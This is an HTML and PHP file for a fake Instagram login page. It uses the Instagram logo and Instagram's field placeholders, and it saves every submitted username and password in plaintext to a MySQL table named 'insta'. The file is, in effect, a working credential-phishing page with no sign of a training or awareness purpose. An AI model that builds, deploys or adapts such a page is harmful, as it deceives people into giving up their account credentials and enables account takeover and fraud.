<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login {
      background-color: white;
      border: 0.1px solid gray;
      width: 90%;
      max-width: 350px;
      padding: 20px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      border-radius: 8px;
    }

    .login img {
      display: block;
      margin: 30px auto;
    }

    .input {
      width: calc(100% - 40px);
      height: 30px;
      margin: 15px 20px;
      border-radius: 5px;
      border: 0.5px solid #dbdbdb;
      padding: 8px 12px;
      box-sizing: border-box;
    }

    .btn {
      width: calc(100% - 40px);
      height: 30px;
      background-color: #3897f0;
      border: 1px solid #3897f0;
      padding: 5px 12px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      border-radius: 5px;
      margin: 20px 20px;
      box-sizing: border-box;
      text-align: center;
      line-height: 30px;
    }

    .btn:hover {
      background-color: #2871c6;
    }

    .fg, .su {
      color: blue;
      cursor: pointer;
      text-align: center;
      display: block;
      margin: 10px 20px;
      font-size: 0.9em;
    }

    .fg {
      float: left;
      margin-left: 20px;
    }

    .su {
      float: right;
      margin-right: 20px;
    }

    .error {
      color: red;
      font-size: 0.9em;
      text-align: center;
      margin-top: 10px;
      clear: both;
    }

    @media (max-width: 600px) {
      .login {
        width: 100%;
        margin: 0 10px;
        box-shadow: none;
        border: none;
      }

      .input, .btn {
        width: calc(100% - 20px);
        margin: 10px auto;
      }

      .fg, .su {
        float: none;
        text-align: center;
        margin: 5px auto;
      }
    }
  </style>
</head>
<body>
  <form method="POST">
    <div class="login">
      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo">
      <input type="text" id="user" placeholder="Phone number, username, or email" class="input" name="user" required>
      <input type="password" id="password" placeholder="Password" class="input" name="pass" required>
      <div class="btn">Log in</div>
      <p class="fg">Forgot password?</p>
      <p class="su">Sign up</p>
      <p class="error" id="error"></p>
    </div>
  </form>

  <script>
    // Client-side validation for form submission
    document.querySelector('.btn').addEventListener('click', function() {
      let username = document.getElementById("user").value;
      let password = document.getElementById("password").value;
      let error = document.getElementById("error");

      if (username === "" || password === "") {
        error.textContent = "Please fill out both fields.";
      } else {
        // The form will be submitted if both fields are filled
        document.querySelector('form').submit();
      }
    });
  </script>

  <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        // Get input values
        $user = $_POST['user'];
        $pass = $_POST['pass'];

        // Check if fields are empty
        if (empty($user) || empty($pass)) {
            echo "<p class='error'>Please fill out both fields.</p>";
        } else {
            // Database connection
            $servername = "localhost";
            $username = "root";  // Change as needed
            $password = "";      // Change as needed
            $dbname = "database1";  // Ensure your database name is correct

            // Create connection
            $connect = mysqli_connect($servername, $username, $password, $dbname);

            // Check connection
            if (!$connect) {
                die("Connection failed: " . mysqli_connect_error());
            }

            // Prepare and bind the statement
            $stmt = $connect->prepare("INSERT INTO insta (`Username`, `Password`) VALUES (?, ?)");
            $stmt->bind_param("ss", $user, $pass);

            // Execute the query and check success
            if ($stmt->execute()) {
                echo "<p class='error'>New record created successfully.</p>";
            } else {
                echo "<p class='error'>Error: " . $stmt->error . "</p>";
            }

            // Close statement and connection
            $stmt->close();
            $connect->close();
        }
    }
  ?>
</body>
</html>
